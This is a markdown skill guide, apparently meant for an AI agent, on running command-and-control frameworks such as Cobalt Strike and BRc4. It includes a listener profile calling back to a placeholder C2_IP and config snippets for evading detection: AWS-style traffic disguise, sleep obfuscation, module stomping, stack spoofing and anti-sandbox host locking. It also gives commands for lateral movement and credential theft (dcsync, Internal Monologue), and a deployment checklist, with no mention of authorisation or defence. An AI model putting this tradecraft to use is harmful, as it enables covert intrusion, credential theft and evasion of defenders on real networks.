# C2 Framework Operations

## Overview
Command & Control frameworks provide persistent, encrypted, evasive access to compromised systems. This skill covers C2 architecture, profile configuration, evasion techniques, and operational patterns applicable to frameworks like BRc4, Cobalt Strike, Sliver, and Havoc.

## C2 Architecture Components

### Server (Team Server / Ratel Server)
- Listens for badger/beacon callbacks
- Manages operators (admin + user roles)
- Hosts listeners on configurable ports
- Handles encrypted comms via profile-defined keys
- Config: `c2_handler: "0.0.0.0:8443"`

### Listener
- HTTP/HTTPS (primary - looks like web traffic)
- SMB named pipes (lateral movement, no network traffic)
- TCP (pivot through compromised hosts)
- DNS (extremely covert, slow)
- External C2 (Slack, Teams, cloud APIs - most evasive)

### Badger/Beacon (Implant)
- Runs on compromised host
- Calls back to listener on sleep interval + jitter
- Encrypted comms with profile-defined encoding
- Kill date - auto-terminates after specified date
- Key strategy - locks to specific host (hostname/username/domain)

### Profile
Defines how C2 traffic looks on the wire:
```json
{
  "listeners": {
    "primary-c2": {
      "host": "C2_IP",
      "port": "443",
      "ssl": true,
      "c2_uri": ["en/ec2/pricing", "locale=en"],
      "useragent": "Mozilla/5.0 ...",
      "request_headers": {"Content-Type": "application/json"},
      "prepend": "{\"Action\":\"CreateResource\",...,\"SecretAccessKey\":\"",
      "append": "\"}",
      "empty_response": "{\"ResponseMetadata\":{...}}",
      "sleep": 1,
      "jitter": 0,
      "data_encoding": "Base64"
    }
  }
}
```

## Evasion Techniques

### Traffic Blending
- **Prepend/Append**: Wrap C2 data inside legitimate-looking JSON (AWS API responses, Azure calls)
- **URI paths**: Use paths that look like real services (`/en/ec2/pricing`)
- **Headers**: Match real service headers (Content-Type, Referer, Server)
- **User-Agent**: Current browser string
- **Empty response**: Return realistic "no task" response

### Sleep Obfuscation
- **APC** - Queue APC to sleep, encrypts memory during sleep
- **Pooling** - Uses thread pool timers
- **Timer** - Uses waitable timers
- Purpose: Encrypted in-memory while sleeping, no scannable strings

### Module Stomping
- `"stomp": "chakra.dll"` - Overwrite a legitimate DLL's .text section with badger code
- Makes memory forensics harder - looks like legit DLL

### Stack Spoofing
- `"stack_chain": "user32.dll!GetMessageW+0x2E,SHCore.dll!..."`
- Fake call stack to look like legitimate Windows API calls
- Defeats stack-based detection

### Key Strategy
- Lock badger to specific host: `"key_strategy_type": "hostname", "key_strategy_value": "DESKTOP-XYZ"`
- Badger won't run on wrong machine - anti-sandbox, anti-analysis

### Kill Date
- `"killdate": "01 Dec 24 00:00 IST"` - Auto-terminates after date
- Limits exposure window

## Payload Types

### HTTP/HTTPS Badger
Primary comms over web traffic. Most common.

### SMB Badger
Communicates via named pipes (`\\.\pipe\mynamedpipe`). Used for:
- Lateral movement (no network traffic, uses SMB)
- Pivoting through hosts that can't reach internet
- Chaining: HTTP badger → SMB badger → deeper network

### TCP Badger
Direct TCP connection. Used for:
- Pivot listeners on compromised hosts
- Local network communication

### External C2 (Adaptive C2)
Route C2 through legitimate services:
- **Slack** - Messages as C2 channel (split large payloads into chunks)
- **Teams** - Similar approach
- **Cloud APIs** - AWS, Azure as C2 redirectors
- **DNS over HTTPS** - DoH as covert channel

## Lateral Movement

### PSExec
```json
"psexec_config": {
    "psexec_svc_desc": "Manages universal application...",
    "psexec_svc_name": "TransactionBrokerService"
}
```
Custom service name and description to blend in.

### WMI Execution
```
wmiexec notepad
wmiquery select * from win32_operatingsystem
```

### Token Manipulation
```
make_token network domain\user password
dcsync
revtoken
```

## Post-Exploitation

### Credential Harvesting
- `dcsync` - DCSync attack for domain hashes
- `monologue` - Internal Monologue (NTLM downgrade)
- `seatbelt` - System enumeration

### BOF (Beacon Object Files)
Custom compiled object files executed in-memory:
```json
"register_obj": {
    "custom_bof": {
        "arch": "x64",
        "file_path": "path/to/bof.o",
        "artifact": "WINAPI"
    }
}
```

### Reflective DLL / PE Loading
Load executables in-memory without touching disk:
```json
"register_pe": { ... }
"register_pe_inline": { ... }
"register_dll": { ... }
```

## Operational Checklist
- [ ] Generate TLS certs for listener
- [ ] Configure profile with target-appropriate traffic pattern
- [ ] Set kill date
- [ ] Set key strategy (lock to target hostname)
- [ ] Configure sleep + jitter (lower = faster, noisier)
- [ ] Set up fallback listener
- [ ] Configure adaptive C2 if available (Slack/cloud)
- [ ] Test payload in sandbox before deployment
- [ ] Verify traffic blending with packet capture
